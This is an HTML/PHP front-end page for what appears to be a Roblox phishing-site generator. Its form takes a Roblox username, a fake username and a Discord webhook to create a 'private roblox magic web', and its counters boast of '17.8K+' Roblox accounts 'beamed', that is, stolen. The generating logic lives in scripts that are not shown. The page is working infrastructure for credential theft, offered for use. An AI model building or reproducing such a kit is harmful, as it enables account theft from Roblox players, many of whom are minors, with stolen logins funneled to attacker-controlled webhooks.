
<!doctype html>
<html lang="en">
<?php include("Admin/termed.php"); ?>
<head>
<title>Generator | Page</title>
<link rel="shortcut icon" href="assets/img/icon.png" type="image/x-icon" />

<meta charset="utf-8">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />


<link href="https://fonts.googleapis.com/css?family=Poppins:200,300,400,600,700,800" rel="stylesheet">
<link href="../../use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet">

<link href="assets/css/black-dashboard69ea.css?v=1.1.2" rel="stylesheet" />
<link href="assets/demo/demod41d.css?" rel="stylesheet" />
<link href="assets/css/nucleo-icons.css" rel="stylesheet" />
<link href="../../cdn.jsdelivr.net/npm/%40sweetalert2/theme-dark%404/dark.css" rel="stylesheet">

<link href="assets/font-awesome/css/fontawesome.css" rel="stylesheet">
<link href="assets/font-awesome/css/brands.css" rel="stylesheet">
<link href="assets/font-awesome/css/solid.css" rel="stylesheet">
</head>
<body>
<div class="wrapper">
<div class="full-page">
<div class="main-panel">
<nav class="navbar navbar-expand-lg navbar-transparent navbar-absolute fixed-top ">
<div class="container-fluid">
<div class="navbar-wrapper">
<a class="navbar-brand" href="#"><?php echo $name ?></a>
</div>
<div class="collapse navbar-collapse justify-content-end">
<ul class="navbar-nav">
<li class="nav-item">
<a class="nav-link" href="sign-in">
<i class="fa-solid fa-right-to-bracket fa-beat-fade"></i> Login</a>
</li>

</ul>
</div>
</div>
</nav>
<div class="content">
<div class="container">
<div class="row">
<div class="col-lg-10">
<div class="card mb-3">
<img class="card-img-top" src="https://media.discordapp.net/attachments/1186645655444267095/1198369901082066993/standard.gif?ex=65bea7f1&is=65ac32f1&hm=a4dbf4b8d15934b73dcbfd9c02574fddba1cc1ea844e1b44967c099dfb84ac5a&=&width=631&height=80" alt="Card image cap">
<div class="card-body">
<h4 class="card-title">Generate your private roblox magic web</h4>
<p class="card-text"><?php echo $name ?> WEB easy to use and have perfect fetures will make you happy!</p>
<p class="card-text">
<small class="text-muted">create for now</small>
</p>
</div>
</div>
</div>
</div>
<div class="row">
<div class="col-lg-10">
<div class="card">
<div class="card-body">
<form method="post">
<div class="form-group mb-3">
<label class="label" for="RealUsername">Roblox Username</label>
<input type="text" id="RealUsername" class="form-control" placeholder="Roblox Username" required=""> </div>
<div class="form-group mb-3">
<label class="label" for="password">Roblox Fake Username</label>
<input type="text" id="FakeUsername" class="form-control" placeholder="Fake Username" required=""> </div>
<div class="form-group mb-3">
<label class="label" for="password">Discord Webhook</label>
<input type="text" id="Webhook" class="form-control" placeholder="Webhook" required=""> </div>
<button type="button" onclick="Regular(this);" class="form-control btn btn-primary submit px-3">Create Now!</button>
</form>
</div>
</div>
</div>
</div>
<div class="row">
<div class="col-lg-5">
<div class="card card-chart">
<div class="card-header">
<h5 class="card-category">Total Account Active</h5>
<h3 class="card-title" id="chartTotal"><i class="tim-icons icon-bell-55 text-primary" id=""></i> 199</h3>
</div>
<div class="card-body">
<div class="chart-area">
<div class="chartjs-size-monitor" style="position: absolute; inset: 0px; overflow: hidden; pointer-events: none; visibility: hidden; z-index: -1;">
<div class="chartjs-size-monitor-expand" style="position:absolute;left:0;top:0;right:0;bottom:0;overflow:hidden;pointer-events:none;visibility:hidden;z-index:-1;">
<div style="position:absolute;width:1000000px;height:1000000px;left:0;top:0"></div>
</div>
<div class="chartjs-size-monitor-shrink" style="position:absolute;left:0;top:0;right:0;bottom:0;overflow:hidden;pointer-events:none;visibility:hidden;z-index:-1;">
<div style="position:absolute;width:200%;height:200%;left:0; top:0"></div>
</div>
</div>
<canvas id="lineChartCount"></canvas>
</div>
</div>
</div>
</div>
<div class="col-lg-5">
<div class="card card-chart">
<div class="card-header">
<h5 class="card-category">Total Roblox Account Beamed</h5>
<h3 class="card-title" id="chartBeamed"><i class="tim-icons icon-bell-55 text-primary"></i> 17.8K+</h3>
</div>
<div class="card-body">
<div class="chart-area">
<div class="chartjs-size-monitor" style="position: absolute; inset: 0px; overflow: hidden; pointer-events: none; visibility: hidden; z-index: -1;">
<div class="chartjs-size-monitor-expand" style="position:absolute;left:0;top:0;right:0;bottom:0;overflow:hidden;pointer-events:none;visibility:hidden;z-index:-1;">
<div style="position:absolute;width:1000000px;height:1000000px;left:0;top:0"></div>
</div>
<div class="chartjs-size-monitor-shrink" style="position:absolute;left:0;top:0;right:0;bottom:0;overflow:hidden;pointer-events:none;visibility:hidden;z-index:-1;">
<div style="position:absolute;width:200%;height:200%;left:0; top:0"></div>
</div>
</div>
<canvas id="lineChartBeamed"></canvas>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<footer class="footer">
<div class="container-fluid">
<div class="copyright float-center"> &copy; <script type="e19d9a32e16394972eaa8471-text/javascript">
                  document.write(new Date().getFullYear())
                </script>, made with <i class="fa-solid fa-heart-pulse fa-bounce"></i> by <a href target="_blank"><?php echo $name ?></a>
</div>

</div>
</footer>
</div>
</div>
</div>

<input name="challenge" id="challenge" value="WkVYeTdnQWhzdUFRWEx5cHR0T3dKUT09" type="hidden">
<input name="site_key" id="site_key" value="6LcODAEnAAAAAFU4LBp1yZ3Kgd8r3UIuX3_zBeX1" type="hidden">

<script src="../../www.google.com/recaptcha/apie9f3.js?render=6LcODAEnAAAAAFU4LBp1yZ3Kgd8r3UIuX3_zBeX1" type="e19d9a32e16394972eaa8471-text/javascript"></script>
<script src="assets/js/core/jquery.min.js" type="e19d9a32e16394972eaa8471-text/javascript"></script>
<script src="../../cdn.jsdelivr.net/npm/sweetalert2%4011/dist/sweetalert2.min.js" type="e19d9a32e16394972eaa8471-text/javascript"></script>
<script src="assets/js/core/popper.min.js" type="e19d9a32e16394972eaa8471-text/javascript"></script>
<script src="assets/js/core/bootstrap.min.js" type="e19d9a32e16394972eaa8471-text/javascript"></script>
<script src="assets/js/plugins/perfect-scrollbar.jquery.min.js" type="e19d9a32e16394972eaa8471-text/javascript"></script>
<script src="assets/main.min.js" type="e19d9a32e16394972eaa8471-text/javascript"></script>

<script src="https://maps.googleapis.com/maps/api/js?key=YOUR_KEY_HERE" type="e19d9a32e16394972eaa8471-text/javascript"></script>

<script src="assets/js/plugins/chartjs.min.js" type="e19d9a32e16394972eaa8471-text/javascript"></script>

<script src="assets/js/plugins/bootstrap-notify.js" type="e19d9a32e16394972eaa8471-text/javascript"></script>

<script src="assets/js/black-dashboarde209.js?v=1.0.0" type="e19d9a32e16394972eaa8471-text/javascript"></script>
<script src="apis/main.js"></script>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script src="../cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="e19d9a32e16394972eaa8471-|49" defer></script></body>
</html>